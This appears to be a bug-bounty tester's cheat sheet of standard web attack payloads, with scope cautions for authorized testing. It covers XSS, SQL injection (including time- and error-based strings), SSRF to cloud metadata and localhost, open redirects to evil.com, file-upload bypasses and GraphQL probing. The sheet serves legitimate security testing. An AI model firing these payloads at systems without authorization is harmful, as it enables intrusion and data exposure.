# Payload Cheat Sheet

Short reminders only. The full payloads live in
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
— check there while testing. Never paste a payload into a live target
without understanding what it does, and never use a destructive payload
on a live program.

## XSS

- Basic: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- Event handlers: `onfocus`, `onmouseover`, `onanimationend`
- URL schemes in links: `javascript:`, `data:text/html,`
- Stored: test every field that renders elsewhere, not just where it
  is stored. Check the second context (preview, export, notification).

## SQL injection

- `' OR 1=1 --`, `" OR "1"="1`, `' UNION SELECT 1,2,3 --`
- Time-based: `' AND SLEEP(5) --`
- Error-based: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --`
- Test sort/order parameters too — they are often injectable.

## SSRF

- `http://169.254.169.254/latest/meta-data/` (cloud metadata — test only
  where the program allows it, and only to prove the request is made).
- `http://localhost:8080/admin`, `http://127.0.0.1:6379/`
- DNS rebinding and redirect chains: `http://attacker.com/redirect`
  pointing at an internal host.
- Use your own callback server (webhook.site, Burp Collaborator) to
  prove the request. Never read internal data beyond the proof.

## IDOR / access control

- Change the ID: sequential, UUID from a response, slug.
- Change the role field, tenant field, or owner field in the body.
- Try the same action as account B on account A's object — the
  comparison is the proof.

## Open redirect

- `//evil.com`, `https://evil.com`, `/\evil.com`, `javascript:alert(1)`
- Check `next`, `returnUrl`, `redirect_back_url`, `url` parameters.

## File upload

- Double extension: `file.php.jpg`, `file.jpg.php`
- Content-type mismatch: `image/png` header with PHP content.
- SVG with script: `<svg onload=alert(1)>`
- Null byte (old systems): `file.php%00.jpg`
- Check where the file is served from afterwards — same origin is the
  risk.

## GraphQL

- Introspection: `{ __schema { types { name } } }`
- Depth: nested queries to test complexity limits.
- Batching: several queries in one request.
- Field-level IDOR: a nested resolver that returns another user's
  object.

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PayloadsAllTheThings web version](https://swisskyrepo.github.io/PayloadsAllTheThings/)
